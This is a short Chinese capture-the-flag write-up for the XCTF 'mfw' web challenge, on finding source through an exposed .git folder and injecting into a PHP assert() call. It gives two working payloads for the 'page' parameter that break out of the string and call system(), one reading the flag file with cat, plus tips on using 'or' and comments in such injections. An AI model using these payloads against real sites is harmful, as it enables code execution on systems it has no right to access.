# 攻防世界 mfw(难度3)代码审计

## 思路

- 首先`.git`可以下载源码
- 但是我忘记了`GitHack`可以查看源码

## wp

- 下载源码后，有`assert`函数，这个东西当成eval处理

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681912921411-f884b4be-db77-4614-bcdf-086130deaf1e.png#averageHue=%232c313d&clientId=uc4b40f47-08a4-4&from=paste&height=285&id=u1f31f4c6&originHeight=570&originWidth=1407&originalType=binary&ratio=2&rotation=0&showTitle=false&size=385756&status=done&style=none&taskId=ue617ca6b-0262-499d-8782-188b9de4878&title=&width=703.5)

- 所以这里可以通过闭合的方式注入

```php
page=') or system('/templates/flag.php')
page='.system("cat ./templates/flag.php").'
```

## 总结

- `or`可以用在字符串中，作用相当于`;`
- 可以用单行注释`# 或 //`,多行注释`/*`注释后面的内容